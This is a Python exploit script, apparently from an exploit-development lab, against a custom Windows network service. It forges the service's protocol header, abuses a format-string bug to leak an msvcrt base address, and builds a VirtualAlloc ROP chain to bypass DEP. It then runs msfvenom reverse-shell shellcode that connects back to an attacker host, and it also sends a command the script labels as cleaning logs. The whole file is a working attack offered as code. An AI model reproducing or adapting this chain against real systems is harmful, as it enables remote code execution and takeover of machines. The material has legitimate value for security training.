import socket
import time
import ctypes
import re
from struct import pack
from random import randint


def xor(value, key):
    return value ^ key


def xor_and_ret_byte(value, key):
    encrypted = value ^ key
    return encrypted.to_bytes(length=4, byteorder="little")


def shl(dest, count):
    return (dest << count) & 0xFFFFFFFF


def shr(dest, count):
    return (dest >> count) & 0xFFFFFFFF


def get_shifted_timestamp():
    epoch = int(time.time())
    left_shifted_epoch = shl(epoch, 4)
    or_shifted_epoch = left_shifted_epoch | 0x0FFFF0000
    right_shifted_epoch = shr(or_shifted_epoch, 8)
    return right_shifted_epoch


def send_request(payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.100.8", 1337))
    s.send(payload)
    response = s.recv(1024)
    s.close()
    return response


def signature_1():
    xor_key = 0x30383132
    word_1 = 0x696e7669
    return xor_and_ret_byte(word_1, xor_key)


def signature_2():
    value_to_match_for_word_part_2 = 0x63747573
    timestamp = get_shifted_timestamp()
    word_2 = value_to_match_for_word_part_2 ^ timestamp
    word_2 = word_2 ^ 0x30383132
    return pack("<L", word_2)


def checksum(payload):
    payload_len = len(payload)
    csum = payload_len ^ 0x30383132
    csum = shl(csum, 9)
    csum = csum * 0x10624DD3
    csum = shr(csum, 32)
    csum = csum >> 6
    return pack("<L", csum)


def get_header(opcode, payload):
    payload_len = len(payload)
    base_payload = b""
    base_payload += signature_1()
    base_payload += signature_2()

    base_payload += pack("<L", payload_len)
    base_payload += pack("<L", opcode)
    base_payload += checksum(payload)
    return base_payload


def send(opcode, payload):
    header = get_header(opcode, payload)
    response = send_request(header + payload)
    return response


def p(address):
    return pack("<L", address)


def getRop(base):
    # GOALS Pushad chain
    # EDI[done] => Pointer to RET instruction
    # ESI[done] => jmp [eax] / ptr to VirtualAlloc
    # EBP[done] => push esp ; ret (jmp, call)
    # ESP[done] => leave as is
    # EBX[done] => dwSize
    # EDX[done] => flAllocationType
    # ECX[done] => flProtect
    # EAX[done] => ptr t0x3B922o VirtualAlloc / nops (offset to msvcrt +b61a8)

    # ESI affects ESI
    esi = p(base + 0x3be2d)  # pop esi; ret
    esi += p(base + 0xd178)  # jmp [eax]

    # EDI affects EDI
    edi = p(base + 0x3c630)  # pop edi; ret
    edi += p(base + 0x98249)  # ret;

    # EBP affects EBP
    ebp = p(base + 0x2fa11)  # pop ebp; ret
    ebp += p(base + 0x97448)  # push esp; ret

    # EAX affects EAX
    eax = p(base + 0x97dfb)  # pop eax; ret
    eax += p(base + 0xb81b8)  # ptr VirtualAlloc from IAT

    # EBX affects EBX, EAX
    ebx = p(base + 0x3aa22)  # pop eax; ret
    ebx += p(0x1)  # 0x1
    ebx += p(base + 0x17926)  # xchg ebx, eax; ret

    # EDX affects EDX, EAX, EBP
    edx = p(base + 0x3aa22)  # pop eax; ret
    edx += b"A" * 0x10  # account for ret10 from ecx
    edx += p(0x1000)
    edx += p(base + 0x57994)  # mov edx, eax; mov eax, ecx; pop ebp; ret;
    edx += b"A" * 4  # junk for ebp

    # ECX affects ECX, ESI, EAX
    ecx = p(base + 0x3aa22)  # pop eax; ret
    ecx += p(0x40)
    ecx += p(base + 0x47d5d)  # mov ecx, eax; mov eax, esi; pop esi; ret 0x10;
    ecx += b"A" * 4  # junk for esi

    # PUSHAD
    pushad = p(base + 0x56f67)  # pushad; ret

    rop = ecx + edx + ebx + esi + edi + ebp + eax + pushad
    return rop


# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.4 LPORT=8080 -f python -v shellcode
shellcode = b""
shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
shellcode += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
shellcode += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"
shellcode += b"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
shellcode += b"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40"
shellcode += b"\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
shellcode += b"\x6a\x05\x68\xc0\xa8\x64\x04\x68\x02\x00\x1f"
shellcode += b"\x90\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74"
shellcode += b"\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75"
shellcode += b"\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d"
shellcode += b"\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12"
shellcode += b"\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01"
shellcode += b"\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
shellcode += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc"
shellcode += b"\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
shellcode += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2"
shellcode += b"\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
shellcode += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f"
shellcode += b"\x6a\x00\x53\xff\xd5"

if __name__ == "__main__":
    response = send(
        0x805,
        b"0"
    )
    print("Logs are cleaned")

    send(
        0x801,
        b"C:\\Windows\\Temp\\log.txt\0" + b"0x%%x" * 12
    )
    print("File poisining request sent")

    send(
        0x804,
        b"C:\\Windows\\Temp\\log.txt\0"
    )
    print("Processing format string")

    response = send(
        0x804,
        b"C:\\Windows\\Temp\\log.txt\0"
    )
    print("Retrieving stack address")
    pattern = r"(0x.*?)(?=(?:0x|$))"
    matches = re.findall(pattern, response.decode('latin-1'))
    msvcrt_expandtime_250 = int(matches[12], 16)
    msvcrt_base = msvcrt_expandtime_250 - 0x8b001
    print(hex(msvcrt_base))

    size = 2048
    offset = 284

    va = pack("<L", (0x45454545))  # dummy VirutalAlloc Address
    va += pack("<L", (0x46464646))  # Shellcode Return Address
    va += pack("<L", (0x47474747))  # dummy Shellcode Address
    va += pack("<L", (0x48484848))  # dummy dwSize
    va += pack("<L", (0x49494949))  # dummy flAllocationType
    va += pack("<L", (0x51515151))  # dummy flProtect

    payload = b""
    payload += b"A" * (offset - len(va))  # Junk
    payload += va
    payload += getRop(msvcrt_base)
    payload += shellcode
    payload += b"C" * (size - len(payload))  # Junk

    filename = "C:\\Windows\\Temp\\payload_" + \
        str(randint(100000000, 999999999)) + ".txt"

    with open(filename, "wb") as payload_fd:
        payload_fd.write(payload)
        payload_fd.close()

    response = send(
        0x800,
        filename.encode() + b"\0"
    )
